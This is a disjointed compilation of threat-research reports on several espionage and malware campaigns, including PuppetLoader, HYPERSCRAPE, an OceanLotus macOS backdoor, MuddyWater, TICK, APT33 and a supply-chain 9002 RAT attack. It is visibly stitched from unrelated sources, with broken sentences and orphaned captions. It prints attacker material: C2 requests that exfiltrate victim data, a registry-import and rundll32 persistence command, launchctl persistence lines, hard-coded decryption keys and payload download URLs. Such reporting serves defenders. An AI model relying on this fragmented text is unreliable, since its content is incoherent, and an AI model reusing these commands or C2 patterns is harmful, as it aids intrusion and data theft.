We recently discovered a new advanced persistent threat (APT) group that we have dubbed Earth Berberoka (aka GamblingPuppet).
"Based on our analysis, this group targets gambling websites."
"Our investigation has also uncovered that Earth Berberoka targets the Windows, Linux, and macOS platforms, and uses malware families that have been historically attributed to Chinese-speaking individuals."
"This malware lineup includes tried-and-tested malware families that have been upgraded, such as PlugX and Gh0st RAT, and a brand-new multistage malware family that we have dubbed PuppetLoader."
"We discuss the full technical details of Earth Berberoka’s malware families aimed at Linux and macOS as well as Windows, infection vectors, targets, and possible connections with other APT groups in our research paper “Operation Earth Berberoka: An Analysis of a Multivector and Multiplatform APT Campaign Targeting Online Gambling Sites.” Technical analysis"
PuppetLoader
We discovered a new malware family that we have dubbed PuppetLoader.
"In this stage, a blob of payload data is decrypted using a hard-coded key (2726c6aea9970bb95211304705b5f595) and what appears to be an RC4 (Rivest Cipher 4) algorithm."
"However, the cipher’s “swap” operation in the pseudorandom generation part of the cipher code was improperly implemented."
"It seems that this hard-coded key and flawed RC4 implementation were also used in a malware family named TigerPlug, probably because it spreads the PlugX malware."
Hijacking loaded module
"After the payload is decrypted, it is loaded in the machine’s memory and is executed using a stealthy method: PuppetLoader starts by loading a legitimate DLL from the Windows\System32 directory."
"This is done by hooking NTDLL APIs such as NtQueryAttributesFile, NtOpenFile, NtCreateSection, NtMapViewOfSection, NtQuerySection and ZwClose."
Figure 1.
"For its command-line parameters, PuppetLoader uses the same flawed RC4 implementation using the password “whk0q9ogev6ofg8d”."
These hijacking steps result in the following:
Figure 2. asycfilt.dll shown among loaded module names lz32.dll is opened based on process monitoring tools. Figure 3. lz32.dll shown among opened files Only PuppetLoader’s dropper payload is loaded and none of the previously mentioned libraries is actually loaded.
Stage 2: Dropper
Table 1.
We believe that it serves as a marker that stage 2 has been completed.
It is interesting to note that there is a typographical error in “-InokeMethodParam.”
Stage 3: BasicLoader
Stage 5: Client.MainConsole
"This is the main client binary written in C++, which is the last stage of PuppetLoader’s infection chain."
RemoteModuleCommandPacket
Uploaded file content FileManage_FolderContent_Packet Folder content VecProcessPacket Vector object with running processes InstallModulePacket BMP with encrypted module to be installed
Table 2.
The custom UDP packets recognized by the client
Install module Login callback Enumerate RDP sessions
oRAT
Another malware family that we obtained both Windows and macOS samples of during our investigation was oRAT.
The oRAT droppers that we found in our analysis were a MiMi chat application built using the Electron JS framework and a DMG (disk image) file.
We discuss the full details of both in our research paper.
Figure 6.
The decrypted oRAT configuration The configuration is decrypted using the AES-GCM (AES with Galois/Counter Mode) algorithm.
The control server is implemented by registering routes.
Requesting a URL therefore results in executing the corresponding code on an infected system.
We obtained oRAT samples that register these routes: GET /agent/info GET /agent/ping POST /agent/upload GET /agent/download GET /agent/screenshot GET /agent/zip GET /agent/unzip GET /agent/kill-self GET /agent/portscan GET /agent/proxy GET /agent/ssh GET /agent/net PuppetDownloaders (C++ downloaders)
"During our investigation, we also saw malicious websites that distribute fake Adobe Flash Player updates that were actually delivering C++ downloaders."
The infection starts with an executable written in C++ that connects through a Winsock API to a domain or IP address in a specific port.
"If the SMTemp.dat file exists, the Loader.dll file executes it."
"During our investigation, we noted that the server hosting the second stage of the PuppetDownloaders malware payload was offline."
Figure 7. XOR decryption routine
"We dubbed these downloaders PuppetDownloaders since they are connected to the PuppetLoader malware family, as evidenced by our observations: This malware and PuppetLoader both use the same string decryption routine that uses the same key."
This malware and PuppetLoader both use the same XOR key (2726c6aea9970bb95211304705b5f595) that is used to decrypt the embedded Loader.dll file.
This malware and PuppetLoader’s decrypted Loader.dlls share similar strings such as “[-] UnExist pwszModuleFunName:”.
This suggests that a common framework was used to compile both DLLs.
MFC socket downloaders
We also saw WinRAR self-extracting (SFX) files dropping downloaders written using the Microsoft Foundation Class Library (MFC) framework.
"However, it is possible that multiple groups might be covertly sharing the source code for this malware."
"This malware family sends a DWORD, a 32-bit unsigned integer, in the HELLO packet."
Gh0st RAT
"We also saw at least three different variants of Gh0st RAT, another malware family that has been in the wild for more than 10 years, being used in Earth Berberoka’s campaign."
"This malware family’s source code is public, which is why it has many variants."
One of the variants we analyzed had an interesting destructive feature: It replaces the master boot record (MBR) to display an explicit message (“I am virus ! F*ck you :-)”).
A 2017 Industrial Control Systems Cyber Emergency Response Team (ICS-CERT) report also discussed how Gh0st RAT variants wiped the MBR and replaced it with messages that varied across different samples.
Other Known Malware Families
We also found other legitimate tools being abused by Earth Berberoka and a malware family being used by the group in its campaign: Quasar RAT – a Windows-based open-source RAT that has been used by APT groups for network exploitation
AsyncRAT – an open-source RAT that can be used to remotely monitor and control devices via an encrypted connection Trochilus – a stealthy RAT that can evade sandbox analysis and can be used in cyberespionage campaigns Security recommendations
"In December 2021, TAG discovered a novel Charming Kitten tool, named HYPERSCRAPE, used to steal user data from Gmail, Yahoo!, and Microsoft Outlook accounts."
The attacker runs HYPERSCRAPE on their own machine to download victims’ inboxes using previously acquired credentials.
We have seen it deployed against fewer than two dozen accounts located in Iran.
HYPERSCRAPE demonstrates Charming Kitten’s commitment to developing and maintaining purpose-built capabilities.
"Like much of their tooling, HYPERSCRAPE is not notable for its technical sophistication, but rather its effectiveness in accomplishing Charming Kitten’s objectives."
"HYPERSCRAPE requires the victim’s account credentials to run using a valid, authenticated user session the attacker has hijacked, or credentials the attacker has already acquired."
HYPERSCRAPE won't run unless in a directory with other file dependencies.
In later versions it was obfuscated with Base64.
GET http://{C2}/Index.php?Ck=OK HTTP/1.1
Accept-Encoding: gzip Connection: Keep-Alive
A new form is displayed if the information is not provided via command prompt.
"Again, the response is expected to be ""OK""."
GET http://{C2}/Index.php?vubc={identity} HTTP/1.1
"A new folder named ""Download"" is created adjacent to the main binary."
The browser then navigates to Gmail to begin the data collection.
"If the cookies failed to provide access to the account, a login page is displayed and the attacker can manually enter credentials to proceed, as the program will wait until it finds the inbox page."
"Once the attacker has logged in to the victim’s account, HYPERSCRAPE checks to see if the language is set to English, changing it if not."
The language is returned to its original setting when the run is finished.
HYPERSCRAPE then begins iterating through all available tabs in the inbox looking for emails to download.
A log file is written containing a count of the emails that were downloaded.
"POST http://{C2}/?Key={GUID}&Crc={Identifier} { ""appName"": ""Gmail Downloader"", ""targetname"": ""{Email}"", ""HostName"": ""REDACTED"", ""srcUserIP"": ""REDACTED"", ""actionType"": ""First"", ""timeOccurrence"": ""05/01/2022 05:50:31 PM"", ""OS"": ""REDACTED"", ""OSVersion"": ""REDACTED"", ""SystemModel"": ""REDACTED"", ""SystemType"": ""REDACTED"", ""srcName"": ""REDACTED"", ""srcOrgName"": ""REDACTED"" }"
"x.TextContent.StartsWith(""Access for less secure apps has been turned on"") ||"
"x.TextContent.StartsWith(""Review blocked sign-in attempt"") || x.TextContent."
"x.TextContent.StartsWith(""Access for less secure apps has been turned on"") select x).ToList"
GeckoHtmlElement > (
"public void ManageTakeOut() { string text = ""PipeName"";"
jsonInfo.Data = this.OperationObject.GetUsername(); pipeCommunication.Write(jsonInfo); break; } }
pipeCommunication.Close(); }
We’ll also continue to apply those findings internally to improve the safety and security of our products so we can effectively combat threats and protect users who rely on our services.
"In the meantime, we encourage high risk users to enroll in our Advanced Protection Program (APP) and utilize Google Account Level Enhanced Safe Browsing to ensure they have the greatest level of protection in the face of ongoing threats."
C2s 136.243.108.14 173.209.51.54 HYPERSCRAPE binaries 03d0e7ad4c12273a42e4c95d854408b98b0cf5ecf5f8c5ce05b24729b6f4e369 35a485972282b7e0e8e3a7a9cbf86ad93856378fd96cc8e230be5099c4b89208 5afc59cd2b39f988733eba427c8cf6e48bd2e9dc3d48a4db550655efe0dca798 6dc0600de00ba6574488472d5c48aa2a7b23a74ff1378d8aee6a93ea0ee7364f 767bd025c8e7d36f64dbd636ce0f29e873d1e3ca415d5ad49053a68918fe89f4 977f0053690684eb509da27d5eec2a560311c084a4a133191ef387e110e8b85f ac8e59e8abeacf0885b451833726be3e8e2d9c88d21f27b16ebe00f00c1409e6 cd2ba296828660ecd07a36e8931b851dda0802069ed926b3161745aae9aa6daa
Microsoft Live DLL 1a831a79a932edd0398f46336712eff90ebb5164a189ef38c4dacc64ba84fe23 PDB E:\Working\Projects\EmailDownloader\EmailDownloaderCookieMode\EmailDownloader\obj\Debug\EmailDownloader.pdb
E:\Working\Projects\EmailDownloader\EmailDownloaderCookieMode\Mahdi\LiveLib\obj\Release\LiveLib.pdb
"We identified a MacOS backdoor (detected by Trend Micro as OSX_OCEANLOTUS.D) that we believe is the latest version of a threat used by OceanLotus (a.k.a. APT 32, APT-C-00, SeaLotus, and Cobalt Kitty)."
The attackers behind OSX_OCEANLOTUS.D target MacOS computers which have the Perl programming language installed.
The MacOS backdoor was found in a malicious Word document presumably distributed via email.
Figure 1. Graphic used by the malicious document
"Upon receiving the malicious document, the user is advised to enable macros."
"In our analysis, the macro is obfuscated, character by character, using the decimal ASCII code."
This is shown in the figure below.
Figure 2.
Code snippet of the obfuscated document
It extracts theme0.xml file from the Word document.
"theme0.xml is a Mach-O 32-bit executable with a 0xFEEDFACE signature that is also the dropper of the backdoor, which is the final payload."
theme0.xml is extracted to /tmp/system/word/theme/syslogd before it’s executed.
Figure 3. Deobfuscated Perl payload from the delivery document Dropper analysis
Figure 4.
The main function of the dropper
Figure 5. Hardcoded RSA256 key showing the first 20 characters
The locations:
For regular user path: ~/Library/Spelling/ processname: spellagentd
"Subsequently, it implements the Loader::installLoader method, reading the hardcoded 64-bit Mach-O executable (magic value 0xFEEDFACF), and writing to the previously determined path and file."
Figure 6.
The magic value 0xFEEDFACF that belongs to Mach-O Executable (64 bit) Methods GET_LAUNCHNAME and GET_LABELNAME will return the hardcoded name of the property list “.plist” for the root user (com.apple.screen.assistantd.plist) and for the regular user (com.apple.spell.agent.plist).
Figure 8.
Property list with persistence settings launchctl load /Library/LaunchDaemons/filename.plist > /dev/nul or launchctl load ~/Library/LaunchAgents/ filename.plist > /dev/nul will then command the operating system to start the dropped backdoor file at login.
Backdoor analysis
"Meanwhile, runHandle is responsible for the backdoor capabilities."
Figure 9.
The main functions of the backdoor infoClient fills up the variables in HandlePP class.
Figure 10.
The HandlePP::getClientID method uses the following environment variables: Figure 11. Serial number Figure 12.
Hardware UUID Figure 13.
MAC address Figure 14.
Randomly generated UUID
"For the initial information packet, the backdoor also collects the following: Figure 15."
Figure 16.
Parser::inBytes method
"If clientID equals the following sequence of bytes B4 B1 47 BC 52 28 28 73 1F 1A 01 6B FA 72 C0 73, then the scrambled version is computed using the third parameter (0x10), which is treated as a DWORD."
"Each quadruple of bytes is XOR-ed with it, as shown in example below."
Figure 17.
Parser::inByte method
Figure 18.
Parser::inString method
Let’s say we want to scramble string ‘Mac OSX 10.12.’
The final 5-byte sequence looks like F3 00 00 00 92 0D.
The original string is then XOR’ed with the 5-byte sequence.
Figure 19.
Scrambling ‘Mac OSX 10.12’ Encryption
Encoding the encryption key
"However, this key is also scrambled with operation XOR 0x13 followed by ROL 6 operation applied to each byte."
Figure 20. Function for scrambling AES256 key in the outgoing packet
The highlighted bytes represent the scrambled computer info Figure 22.
"Randomly generated AES256 key Figure 23. Scrambled AES256 key (0xC1 XOR 0x13 = 0xD2, 0xD2 ROL 6 = 0xB4) etc.)"
Figure 24.
Computer info encrypted with AES256 key Figure 25.
Screenshot of the final payload to be sent to C&C server.
Other bytes are just randomly generated noise.
STRINGDATA::BROWSER_SESSION_ID
m_pixel_ratio)
STRINGDATA::RESOURCE_ID
The getCommand method
The figure below shows the example of two of several possible command codes.
"Malicious attacks targeting Mac devices are not as common as its counterparts, but the discovery of this new MacOS backdoor that is presumably distributed via phishing email calls for every user to adopt best practices for phishing attacks regardless of operating system."
"Enterprises can benefit from Trend Micro’s Smart Protection Suites with XGen™ security, which infuses high-fidelity machine learning into a blend of threat protection techniques to eliminate security gaps across any user activity and any endpoint. Indicators of Compromise (IoCs) C&C servers Ssl[.]arkouthrie[.]com s3[.]hiahornber[.]com widget[.]shoreoa[.]com SHA256 Delivery document (W2KM_OCEANLOTUS.A): 2bb855dc5d845eb5f2466d7186f150c172da737bfd9c7f6bc1804e0b8d20f22a Dropper (OSX_OCEANLOTUS.D): 4da8365241c6b028a13b82d852c4f0155eb3d902782c6a538ac007a44a7d61b4 Backdoor (OSX_OCEANLOTUS.D): 673ee7a57ba3c5a2384aeb17a66058e59f0a4d0cddc4f01fe32f369f6a845c8f Tags Malware | APT & Targeted Attacks | Endpoints | Research | Network"
MuddyWater is a well-known threat actor group that has been active since 2017.
"They target groups across Middle East and Central Asia, primarily using spear phishing emails with malicious attachments."
The group has been quite visible since the initial 2017 Malwarebytes report on their elaborate espionage attack against the Saudi Arabian government.
"However, we recently observed a few interesting delivery documents similar to the known MuddyWater TTPs."
"Our analysis revealed that they drop a new backdoor, which is written in PowerShell as MuddyWater’s known POWERSTATS backdoor."
"But, unlike previous incidents using POWERSTATS, the command and control (C&C) communication and data exfiltration in this case is done by using the API of a cloud file hosting provider."
"The screenshots below show the malicious attachments, which are disguised to look real, similar to any typical phishing document."
"If the targeted victims enable macros, then the malicious process continues."
Figure 1.
Fake Office document tries to get user to enable malicious macros.
The blurred document contains logos of different Turkish government entities Figure 2.
"A similar fake Office document has blurred logos for a Turkish government institution related to taxes The macros contain strings encoded in base52, which is rarely used by threat actors other than MuddyWater."
The group is known to use it to encode their PowerShell backdoor.
"After enabling macros, a .dll file (with a PowerShell code embedded) and a .reg file are dropped into %temp% directory."
"The macro then runs the following command: ""C:\Windows\System32\cmd.exe"" /k %windir%\System32\reg.exe IMPORT %temp%\B.reg"
"Running this registry file adds the following command to the Run registry key: rundll32 %Temp%\png.dll,RunPow Figure 3."
"Run registry key We assume that RunPow stands for “run PowerShell,” and triggers the PowerShell code embedded inside the .dll file."
The PowerShell code has several layers of obfuscation.
Figure 4.
Encrypted PowerShell code
The other layers are simple obfuscated PowerShell scripts.
But the last layer is the main backdoor body.
This backdoor has some features similar to a previously discovered version of the Muddywater backdoor.
Figure 5. String of system information collected from the victim’s system
The previous MuddyWater version collected similar information but used a different separator: Figure 6.
"When we analyzed further, we saw that the communication methods use files named <md5(hard disk serial number)> with various extensions depending on the purpose of the file."
The figure below is the decoded .res file from Figure 9.
Figure 10.
Decoded .res file
"The backdoor supports the following commands: $upload - upload a file to file hosting service $dispos - remove persistence $halt - exit $download - download file from a hosting service No prefix - execute command via Invoke Expression (IEX), a PowerShell command that runs commands or expressions on the local computer Based on our analysis, we can confirm that the targets were Turkish government organizations related to the finance and energy sectors."
"This is yet another similarity with previous MuddyWater campaigns, which were known to have targeted multiple Turkish government entities."
The main delivery method of this type of backdoor is spear phishing emails or spam that uses social engineering to manipulate targets into enabling malicious documents.
It is important that employers and employees across all organizations and enterprises be able to identify phishing attacks and distinguish legitimate emails from malicious ones.
"In general, users should always practice caution when it comes to email."
"Apart from knowledge and awareness of phishing and social engineering, it is also important to be prepared with effective and layered security solutions."
"Trend Micro™ Email Security is a no-maintenance cloud solution that delivers continuously updated protection to stop spam, malware, spear phishing, ransomware, and advanced targeted attacks before they reach the network."
Indicators of Compromise SHA256 Type Detection Name 41ee0ab77b474b0c84a1c25591029533f058e4454d9f83ba30159cc6309c65d1
Delivery documents W2KM_POWRUN.A 43080479eb1b00ba80c34272c5595e6ebdc6b0ffabcdc2c40ea2af49fcc43db4 Dropped DLL file Backdoor.Win32.POWRUN.AA 4f509354d8b3152a40c64ce61f7594d592c1256ad6c0829760b8dbdcb10579a2 Weaponized document BACKDOOR.WIN32.POWRUN.AA 685e91bc4e98c38bda7c8e57d5d40a11e7cf48bb43859bb799813f0146a14fcf Dropped DLL file BKDR_POWRUN.B 888a6f205ac9fc40d4898d8068b56b32f9692cb75f0dd813f96a7bd8426f8652 Dropped DLL file Trojan.W97M.POWRUN.AA 0acd10b14d38a4ac469819dfa9070106e7289ecf7360e248b7f10f868c2f373d Dropped DLL file BKDR_POWRUN.A Tags Cloud | Malware | APT & Targeted Attacks | Endpoints | Research
"While we have been following cyberespionage group TICK (a.k.a. “BRONZE BUTLER” or “REDBALDKNIGHT”) since 2008, we noticed an unusual increase in malware development and deployments towards November 2018."
"Given their targets, we have named this campaign “Operation ENDTRADE,” and identified some of the findings in our research “Operation ENDTRADE: TICK’s Multi-Stage Backdoors for Attacking Industries and Stealing Classified Data”."
Operation ENDTRADE’s timeline
"These email addresses were used for spear phishing, prompting potential victim organizations to open the attachments with malware payloads."
Spear phishing sample in fluent Japanese
"Based on the language that was hardcoded in the samples we found, TICK appeared to be targeting Japanese organizations with subsidiaries in China to serve as footholds for intrusion: TICK hard-coded two code pages 932 and 936, referring to Japanese and Simplified Chinese characters respectively."
Figure 3. Language code pages
Malware Analysis
Figure 4.
"New downloaders and trojans DATPER While this backdoor routine has been associated with TICK’s weapons arsenal, the sample we derived from this campaign had two adjusted mutex objects — d0ftyzxcdrfdqwe and *&Hjgfc49gna-2-tjb — that retrieve information from the victim’s machine."
Figure 5.
DATPER’s new mutex with separate parameters down_new
"This malware combines features of existing trojans in the malware family’s development, based on the adjustments TICK made as we analyzed their test versions."
"Gets MAC address and volume information to send back to the C&C. Executes only during working hours (8:00AM-6:00PM, using kernel32.GetLocalTime API)"
Uses legitimate websites for the C&C server.
Figure 6. Code showing down_new’s command function Table 1.
down_new
Figure 7.
down_new collects home phone data and URL path Avenger
First stage: Information collection 2.
Figure 9.
Third stage: Sending the encrypted file to the C&C
"While steganography is always used as part of TICK’s malware techniques, we found that the group used a more sophisticated steganography technique in this campaign."
Figure 11. Backdoor found in the steganography image Figure 12.
Upgraded steganography technique
"Figure 13. Avenger2 with internal URL Casper Casper is a modified version of the Cobalt Strike backdoor, showing the team server SHA1 hash if the controller connects to the C&C."
Figure 14.
Casper C&C with Cobalt Strike’s server fingerprint
The backdoor is usually hidden in the steganography photo and uses several techniques and tools to bypass AV detection.
Another involves injecting the backdoor’s shellcode into svchost.exe.
Figure 15. Shellcode injected to svchost.exe
"Included in all the malware routines, we also found TICK using publicly available remote access trojans (RATs) and ope n source tools, and either modified or imported the techniques into their malware."
"The list of modified tools the group used include Mimikatz, RAR compression tool, port mapping tool, and screen capture."
Figure 16. Modified screen capture tool Figure 17.
"Modified Mimikatz Conclusion TICK is an organized and persistent cyber espionage group specialized in targeting high-value individuals and organizations, with the skills and resources needed to coordinate sophisticated attacks."
"It provides a comprehensive defense tailored to protect organizations against targeted attacks and advanced threats through specialized engines, custom sandboxing, and seamless correlation across the entire attack lifecycle, allowing it to detect threats like TICK’s attacks even without any engine or pattern update."
"For the full technical analyses of all the malware, techniques, tools, MITRE ATT&CK techniques and indicators of compromise (IoCs) we found in this campaign, download the research brief, “Operation ENDTRADE: TICK’s Multi-Stage Backdoors for Attacking Industries and Stealing Classified Data”. Tags Malware | APT & Targeted Attacks | Endpoints | Research |"
Network
It provides a more comprehensive look at APT33 and other critical threats.
Read the full paper here.
"This blog was originally published on November 13, 2019."
"Updated on November 27, 2019 at 11:00 PM PST to add new information about a C&C domain."
"The group puts up multiple layers of obfuscation to run these C&C servers in extremely targeted malware campaigns against organizations in the Middle East, the U.S., and Asia."
APT33 has also been executing more aggressive attacks over the past few years.
"For example, for at least two years the group used the private website of a high-ranking European politician (a member of her country’s defense committee) to send spear phishing emails to companies that are part of the supply chain of oil products."
Another European oil company suffered from an APT33 related malware infection on one of their servers in India for at least 3 weeks in November and December 2018.
Date From Address Subject 12/31/16 recruitment@alsalam.aero Job Opportunity 4/17/17 recruitment@alsalam.aero Vacancy Announcement 7/17/17 careers@ngaaksa.com Job Openning 9/11/17 jobs@ngaaksa.ga Job Opportunity 11/20/17 jobs@dyn-intl.ga Job Openning 11/28/17 jobs@dyn-intl.ga Job Openning 3/5/18 jobs@mail.dyn-corp.ga Job Openning 7/2/18 careers@sipchem.ga
Job Opportunity SIPCHEM 7/30/18 jobs@sipchem.ga
Latest Vacancy 8/28/18 careers@aramcojobs.ga Latest Vacancy 9/25/18 careers@aramcojobs.ga
AramCo Jobs 10/22/18 jobs@samref.ga
Table 1.
Spear phishing campaigns of APT33.
Source: Trend Micro’s Smart Protection Network
"Aside from the relatively noisy attacks of APT33 against oil product supply chains, we found that APT33 has been using several C&C domains for small botnets comprised of about a dozen bots each."
It appears that APT33 took special care to make tracking more difficult.
The APT33 actors then issue commands to the bots and collect data from the bots using these VPN connections.
"These aggregators get data from very few C&C servers (only 1 or 2), with only up to a dozen victims per unique C&C domain."
Domain Created oorgans.com 5/28/16 suncocity.com 5/31/16 zandelshop.com 6/1/16
simsoshop.com
6/2/16
zeverco.com 6/5/16 qualitweb.com 6/6/16 service-explorer.com 3/3/17 service-norton.com 3/6/17 service-eset.com 3/6/17 service-essential.com 3/7/17 update-symantec.com 3/12/17
Table 2. APT33 C&C domains for extreme narrow targeting Figure 1. Schema showing the multiple obfuscation layers that APT33 uses
Setting up a private VPN can be easily done by renting a couple of servers from datacenters around the world and using open source software like OpenVPN.
IP address
First seen Last seen 5.135.120.57 12/4/18 1/24/19 5.135.199.25 3/3/19 3/3/19 31.7.62.48 9/26/18 9/29/18 51.77.11.46 7/1/19 7/2/19 54.36.73.108 7/22/19 10/05/19 54.37.48.172 10/22/19 11/05/19 54.38.124.150 10/28/18 11/17/18 88.150.221.107 9/26/19 11/07/19 91.134.203.59 9/26/18 12/4/18 109.169.89.103 12/2/18 12/14/18 109.200.24.114 11/19/18 12/25/18 137.74.80.220 9/29/18 10/23/18 137.74.157.84 12/18/18 10/21/19 185.122.56.232 9/29/18 11/4/18 185.125.204.57 10/25/18 1/14/19 185.175.138.173 1/19/19 1/22/19 188.165.119.138 10/8/18 11/19/18 193.70.71.112 3/7/19 3/17/19 195.154.41.72 1/13/19 1/20/19 213.32.113.159 6/30/19 9/16/19 216.244.93.137 12/10/18 12/21/18 Table 3.
IP addresses associated with a few private VPN exit nodes connected to APT33
"Figure 2. APT33’s usage of a private VPN network APT33 used its private VPN network to access websites of penetration testing companies, webmail, websites on vulnerabilities, and websites related to cryptocurrencies, as well as to read hacker blogs and forums."
Improve employee awareness on the latest attack techniques that cybercriminals use.
"As mentioned above, APT33 is known to use spear phishing emails to gain entry into a target’s network, and given their malicious activity the threat is definitively serious."
"Trend Micro™ Hosted Email Security is a no-maintenance cloud solution that delivers continuously updated protection to stop spam, malware, spear phishing, ransomware, and advanced targeted attacks before they reach the network."
Indicators of Compromise
File name SHA256 Detection Name MsdUpdate.exe e954ff741baebb173ba45fbcfdea7499d00d8cfa2933b69f6cc0970b294f9ffd Trojan.Win32.NYMERIA.MLR MsdUpdate.exe b58a2ef01af65d32ca4ba555bd72931dc68728e6d96d8808afca029b4c75d31e Trojan.Win32.SCAR.AB MsdUpdate.exe a67461a0c14fc1528ad83b9bd874f53b7616cfed99656442fb4d9cdd7d09e449 Trojan.Win32.SCAR.AC MsdUpdate.exe c303454efb21c0bf0df6fb6c2a14e401efeb57c1c574f63cdae74ef74a3b01f2 Trojan.Win32.NYMERIA.MLW MsdUpdate.exe 75e6bafc4fa496b418df0208f12e688b16e7afdb94a7b30e3eca532717beb9ba Trojan.Win32.SCAR.AD MsdUpdate.exe 8fb6cbf6f6b6a897bf0ee1217dbf738bce7a3000507b89ea30049fd670018b46 Trojan.Win32.SCAR.AD DysonPart.exe ba9d76cca6b5c7308961cfe3739dc1328f3dad9a824417fad73b842b043daa1a Trojan.Win32.SCAR.AD Unknown 07e1baf1d0207a139bcf39c60354666496e4331381d36eef9359120b1d8497f1 Trojan.Win32.SCAR.AD
Attacks | Endpoints | Research
They carried this out by first stealing the company’s certificate then using it to sign the malware.
9002 RAT also installed additional malicious tools: an exploit tool for Internet Information Services (IIS) 6 WebDav (exploiting CVE-2017-7269) and an SQL database password dumper.
Figure 1.
Operation Red Signature’s attack chain
Here’s how Operation Red Signature works: The code-signing certificate from the remote support solutions provider is stolen.
"It’s possible that the certificate was stolen as early as April 2018, as we found a ShiftDoor malware (4ae4aed210f2b4f75bdb855f6a5c11e625d56de2) on April 8 that was signed with the stolen certificate."
"Malicious update files are prepared, signed with the stolen certificate, and uploaded to the attacker’s server (207[.]148[.]94[.]157)."
The update server of the company is hacked.
The remote support program recognizes the update files as normal and executes the 9002 RAT malware inside it.
9002 RAT downloads and executes additional malicious files from the attackers’ server.
Technical analysis
"9002 RAT is the decrypted rcview.log payload, which connects to the command-and-control (C&C) server at 66[.]42[.]37[.]101. Figure 2. Contents of the malicious update configuration Figure 3. How the compromised update process launches the 9002 RAT malware Figure 4."
Known 9002 RAT string pattern inside the decrypted payload of the rcview.log file Correlating 9002 RAT
"Delving into 9002 RAT, we found that it was compiled on July 17, 2018, and that the configuration files inside update.zip were created on July 18."
"Our analysis of an update log file we found reveals the remote support program’s update process started around 13:35 on July 18, with the 9002 RAT being downloaded and launched."
"Figure 5. Compilation timestamp on 9002 RAT sample (top), timestamp of the malicious configuration (center), and snapshot of the program’s update log (bottom)"
Figure 6. Code snippet showing 9002 RAT checking the system time and setting itself to sleep in August 2018 Additional malware tools
The 9002 RAT also serves as a springboard for delivering additional malware.
View active directory objects dsquery.exe DsQuery
Search for active directory objects sharphound.exe SharpHound
Collect active directory information aio.exe
Dump password from SQL database printdat.dll RAT (PlugX variant)
Remote access tool w.exe IIS 6 WebDav Exploit Tool Exploit tool for CVE-2017-7269 (IIS 6) Web.exe WebBrowserPassView Recover password stored by browser smb.exe Scanner
Scans the system’s Windows version and computer name m.exe Custom Mimikatz (including 32bit / 64bit file)
"It is a variant of PlugX malware, and connects to the same C&C server (66[.]42[.]37[.]101). Figure 8."
Internal PlugX date dword value inside the printdat.dll file Mitigating supply chain attacks
Supply chain attacks don’t just affect users and businesses — they exploit the trust between vendors and its clients or customers.
Indicators of Compromise (IoCs): Related hashes (SHA-256): 0703a917aaa0630ae1860fb5fb1f64f3cfb4ea8c57eac71c2b0a407b738c4e19 (ShiftDoor) — detected by Trend Micro as BKDR_SETHC.D c14ea9b81f782ba36ae3ea450c2850642983814a0f4dc0ea4888038466839c1e (aio.exe)
HKTL_DELOG a3a1b1cf29a8f38d05b4292524c3496cb28f78d995dfb0a9aef7b2f949ac278b
(m.exe)
HKTL_MIMIKATZ 9415ca80c51b2409a88e26a9eb3464db636c2e27f9c61e247d15254e6fbb31eb
(printdat.dll)
— TSPY_KORPLUG.AN 52374f68d1e43f1ca6cd04e5816999ba45c4e42eb0641874be25808c9fe15005 (rcview.log)
— TROJ_SIDELOADR.ENC bcfacc1ad5686aee3a9d8940e46d32af62f8e1cd1631653795778736b67b6d6e
(rcview40u.dll)
— TROJ_SIDELOADR.A 279cf1773903b7a5de63897d55268aa967a87f915a07924c574e42c9ed12de30 (sharphound.exe)
— HKTL_BLOODHOUND e5029808f78ec4a079e889e5823ee298edab34013e50a47c279b6dc4d57b1ffc (ssms.exe) — HKTL_PASSDUMP e530e16d5756cdc2862b4c9411ac3bb3b113bc87344139b4bfa2c35cd816e518 (w.exe)
— TROJ_CVE20177269.MOX 28c5a6aefcc57e2862ea16f5f2ecb1e7df84b68e98e5814533262595b237917d (Web.exe)
— HKTL_BROWSERPASSVIEW.GA URLs related to the malicious update file:
hxxp://207[.]148[.]94[.]157/update/rcv50/update.zip hxxp://207[.]148[.]94[.]157/update/rcv50/file000.zip hxxp://207[.]148[.]94[.]157/update/rcv50/file001.zip URLs related to additionally downloaded malicious files:
hxxp://207[.]148[.]94[.]157/aio.exe hxxp://207[.]148[.]94[.]157/smb.exe hxxp://207[.]148[.]94[.]157/m.ex_ hxxp://207[.]148[.]94[.]157/w hxxp://207[.]148[.]94[.]157/Web.ex_
Related C&C server (9002 RAT and PlugX variant): 66[.]42[.]37[.]101 Tags Network | APT & Targeted Attacks | Research
"As of this writing, our telemetry has detected infection attempts in China."
Routine
"Components of the file and routine appear similar to those of a published entry, while our sample executed .x15cache, the bash script that downloads the malware. Figure 1. Targeted machine using brute force via SSH The shell script downloads, extracts, and executes the miner payload."
File tree of the extracted TAR file Folder a
"contains the cron and anacron binaries, which are the cryptocurrency miners used by the malware."
"One of the files, rsync, is an initially obfuscated Perl-based Shellbot capable of multiple backdoor commands such as file downloading, shell cmd execution, and DDoS. Figure 4. Obfuscated Perl script Figure 5."
Code snippet of unobfuscated rsync
"Another file, ps, is a Linux executable that serves as an SSH backdoor."
Figure 6.
SSH backdoor
The file tree initially showed folder c from dota2[.]tar[.]gz file to be empty.
"However, looking around the related URLs ps tries to connect to, we found mage[.]ignorelist[.]com containing a compressed file, dota[.]tar[.]gz."
Figure 7. Folder c
"The files tsm32 and tsm64 appear to be scanners responsible for propagating the miner and backdoor via SSH brute force, and capable of sending remote commands to download and execute the malware."
Figure 8. tsm32 Figure 9.
Figure 10. .satan file Conclusion
"We also noticed the presence of an APK file hosted in one of the servers, suggesting that if the cybercriminals decide to go further than just infecting servers, they may decide to attack Android-based devices."
